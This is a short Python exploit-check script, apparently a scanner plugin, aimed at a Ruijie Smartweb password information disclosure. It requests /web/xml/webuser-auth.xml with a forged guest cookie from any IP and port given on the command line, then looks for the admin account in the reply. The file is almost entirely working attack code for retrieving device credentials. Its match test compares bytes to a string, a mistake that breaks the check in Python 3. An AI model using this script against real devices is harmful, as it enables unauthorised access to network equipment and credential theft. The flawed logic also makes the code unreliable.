#encoding:utf-8
try:
    import requests,os,logging,sys
    logging.basicConfig(level=logging.INFO,format="%(message)s")
except Exception as e:
    logging.info("[*]".format(e))
    os._exit(6)

def check(ip,port):
    
    payload = "/web/xml/webuser-auth.xml"                                                      #填写payload
    header = {"Cookie": "login=1; oid=1.3.6.1.4.1.4881.1.1.10.1.3; type=WS5302; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest"}
    try:
        tar = "http://" + ip + ":" + port
        req = requests.get(tar + payload,headers=header,timeout=3)
        if req.status_code == 200:                                                          #修改匹配返回代码
            if ( b"<![CDATA[   admin]]>" in req.text ):          #填写匹配信息
                logging.info(u"[+] {} find Ruijie_smartweb_password_information_disclosure".format(ip))                                 #填写漏洞信息
                os._exit(1)

            else :
                logging.info(u"[-] {} do not found Ruijie_smartweb_password_information_disclosure".format(ip))                         #填写漏洞信息
                os._exit(2)

        else :
            logging.info(u"[-] {} do not found Ruijie_smartweb_password_information_disclosure".format(ip))                             #填写漏洞信息
            os._exit(2)
    except Exception as e:
        logging.info("[*] {}".format(e))
        os._exit(4)

if __name__ == "__main__":
    ip = sys.argv[1]
    port = sys.argv[2]
    check(ip,port)
